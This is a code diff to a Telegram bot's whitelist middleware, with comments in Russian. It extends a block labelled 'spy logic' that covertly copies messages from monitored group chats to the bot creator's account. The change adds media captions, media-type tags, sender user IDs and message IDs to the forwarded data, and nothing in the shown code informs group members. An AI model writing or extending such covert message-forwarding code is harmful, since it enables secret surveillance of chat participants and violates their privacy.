@@ -22,16 +22,34 @@ class WhitelistMiddleware(BaseMiddleware):
         # Логика шпионажа
         from database.spy import get_spy_chats
         spy_chats = await get_spy_chats()
+
+        # Если это сообщение и группа под наблюдением
         if chat.id in spy_chats and isinstance(event, Message) and CREATOR_ID and CREATOR_ID != 0:
             bot = data.get('bot')
-            if bot and event.text:
+            if bot:
                 try:
-                    await bot.send_message(
-                        chat_id=CREATOR_ID,
-                        text=f"👁 [<code>{chat.id}</code>] <b>{event.from_user.full_name}</b>: {event.text}"
-                    )
-                except Exception:
-                    pass
+                    # Получаем текст или подпись к медиафайлу
+                    text_content = event.html_text or event.caption or ""
+                    # Если есть какой-то медиафайл/стикер, помечаем это
+                    media_type = ""
+                    if event.photo: media_type = "[Фото] "
+                    elif event.video: media_type = "[Видео] "
+                    elif event.sticker: media_type = "[Стикер] "
+                    elif event.voice: media_type = "[Голосовое] "
+                    elif event.document: media_type = "[Файл] "
+
+                    if text_content or media_type:
+                        await bot.send_message(
+                            chat_id=CREATOR_ID,
+                            text=(
+                                f"👁 <b>[<code>{chat.id}</code>]</b>\n"
+                                f"👤 <b>{event.from_user.full_name}</b> (<code>{event.from_user.id}</code>)\n"
+                                f"🆔 MSG: <code>{event.message_id}</code>\n"
+                                f"💬 {media_type}{text_content}"
+                            )
+                        )
+                except Exception as e:
+                    print(f"Spy Error: {e}")
 
         whitelist = await get_whitelist()
 
